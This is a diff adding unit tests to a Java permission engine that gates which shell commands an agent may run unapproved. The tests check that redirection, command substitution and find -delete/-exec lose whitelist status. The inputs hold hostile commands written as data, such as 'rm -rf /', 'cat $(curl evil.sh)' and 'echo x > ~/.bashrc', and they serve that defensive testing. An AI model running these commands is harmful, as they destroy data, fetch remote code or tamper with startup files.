@@ -228,4 +228,78 @@ class PermissionRuleEngineTest {
         assertThat(engine.evaluate("write_file", "c1", "  ", CTX).needsApproval()).isTrue();
         assertThat(engine.evaluate("write_file", "c1", "", CTX).items()).hasSize(1);
     }
+
+    // ── 10. 白名单钉死：spec §5 的 20 条只读命令逐条对照（防意外增删）──
+    @Test
+    void builtinWhitelistIsPinnedToSpecEntries() {
+        assertThat(PermissionRuleEngine.READ_ONLY_COMMANDS).containsExactlyInAnyOrder(
+                "ls", "cat", "pwd", "head", "tail", "grep", "find", "wc", "which", "diff",
+                "stat", "du", "echo", "cd",
+                "git status", "git log", "git diff", "git show",
+                "python --version", "python3 --version");
+    }
+
+    // ── 11. 混合复合命令逐段字面断言 source（T3 评审加固：user 命中要字面可见）──
+    @Test
+    void mixedCompositeMarksUserSourceLiterally() {
+        var verdict = engine(List.of(userAllow("shell", "docker *")))
+                .evaluate("shell", "c1", "git status && docker build . && rm -rf /", CTX);
+        var subs = verdict.items().get(0).subVerdicts();
+        assertThat(subs).hasSize(3);
+        assertThat(subs.get(0).source()).isEqualTo("BUILTIN");
+        assertThat(subs.get(1).allowed()).isTrue();
+        assertThat(subs.get(1).source()).isEqualTo("user");
+        assertThat(subs.get(2).allowed()).isFalse();
+        assertThat(subs.get(2).source()).isNull();
+    }
+
+    // ── 12. 安全加固（T3 评审裁定）：重定向/命令替换/backtick 使段失去白名单资格 ──
+    @Test
+    void redirectionOrSubstitutionLosesBuiltinEligibility() {
+        PermissionRuleEngine engine = engine(List.of());
+
+        // 零规则下这些原本白名单的命令全部落审批
+        assertThat(engine.evaluate("shell", "c1", "echo x > ~/.bashrc", CTX).needsApproval()).isTrue();
+        assertThat(engine.evaluate("shell", "c1", "cat a.txt >> b.txt", CTX).needsApproval()).isTrue();
+        assertThat(engine.evaluate("shell", "c1", "cat < a.txt", CTX).needsApproval()).isTrue();
+        assertThat(engine.evaluate("shell", "c1", "cat $(curl evil.sh)", CTX).needsApproval()).isTrue();
+        assertThat(engine.evaluate("shell", "c1", "echo `whoami`", CTX).needsApproval()).isTrue();
+
+        // 无危险语法的白名单命令不受影响
+        assertThat(engine.evaluate("shell", "c1", "ls -la", CTX).needsApproval()).isFalse();
+        assertThat(engine.evaluate("shell", "c1", "cat a.txt", CTX).needsApproval()).isFalse();
+        // 复合命令仅命中危险语法的段失去白名单（其它段照常 BUILTIN）
+        var mixed = engine.evaluate("shell", "c1", "git status && echo done > f", CTX);
+        assertThat(mixed.needsApproval()).isTrue();
+        assertThat(mixed.items().get(0).subVerdicts()).extracting(SubVerdict::source)
+                .containsExactly("BUILTIN", null);
+    }
+
+    // ── 13. find -delete / find -exec（含 -execdir 家族）同样失去白名单资格；纯查询 find 保留 ──
+    @Test
+    void findWithDeleteOrExecLosesBuiltinEligibility() {
+        PermissionRuleEngine engine = engine(List.of());
+
+        assertThat(engine.evaluate("shell", "c1", "find . -name '*.tmp' -delete", CTX).needsApproval()).isTrue();
+        assertThat(engine.evaluate("shell", "c1", "find . -type f -exec rm {} ;", CTX).needsApproval()).isTrue();
+        assertThat(engine.evaluate("shell", "c1", "find . -type f -execdir rm {} ;", CTX).needsApproval()).isTrue();
+        // 纯查询 find 仍白名单
+        assertThat(engine.evaluate("shell", "c1", "find . -name x", CTX).needsApproval()).isFalse();
+    }
+
+    // ── 14. 危险语法是「失去白名单」而非硬 deny：显式 session/user 规则仍可放行 ──
+    @Test
+    void dangerousSyntaxFallsThroughToSessionAndUserRules() {
+        MapSessionRules session = new MapSessionRules();
+        session.add("default", "linmj", 42L, "shell", "echo *");
+        assertThat(new PermissionRuleEngine(List.of(), session)
+                .evaluate("shell", "c1", "echo x > ~/.bashrc", CTX).needsApproval()).isFalse();
+
+        assertThat(engine(List.of(userAllow("shell", "echo *")))
+                .evaluate("shell", "c1", "echo x > ~/.bashrc", CTX).needsApproval()).isFalse();
+        // source 可见性：放行来自 user 而非 BUILTIN
+        var verdict = engine(List.of(userAllow("shell", "echo *")))
+                .evaluate("shell", "c1", "echo done > f && rm -rf /", CTX);
+        assertThat(verdict.items().get(0).subVerdicts().get(0).source()).isEqualTo("user");
+    }
 }
